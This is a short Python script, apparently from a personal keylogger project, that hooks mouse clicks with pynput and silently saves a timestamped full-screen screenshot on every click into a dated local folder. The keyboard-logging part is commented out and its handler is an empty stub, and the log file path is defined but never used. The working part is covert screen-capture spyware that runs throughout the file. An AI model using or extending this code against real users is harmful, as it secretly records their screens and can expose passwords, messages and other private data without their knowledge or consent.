from pynput.mouse import Listener as MouseListener
from pynput.keyboard import Listener as KeyboardListener
from datetime import datetime
import re, os, pyautogui as pyt

datanow = datetime.now()
data = datanow.strftime('%d_%m')
folder_new = r'C:\Users\arthu\Desktop\Projetos\K-logPy\screens_' + data + '\\'
arqlog = folder_new + 'keylogger.log'

try:
    os.makedirs(folder_new)
except:
    pass

def on_press():
    pass

def on_click(x, y, button, pressed):
    if pressed:
        screenshot = pyt.screenshot()
        hora = datetime.now()
        horaprint = hora.strftime('%H_%M_%S')
        file_var = folder_new + horaprint +'.jpg'
        screenshot.save(os.path.join(file_var))

#keyboardListener = KeyboardListener(on_press=on_press)
mouseListener = MouseListener(on_click=on_click)

#keyboardListener.start()
mouseListener.start()
#keyboardListener.join()
mouseListener.join()
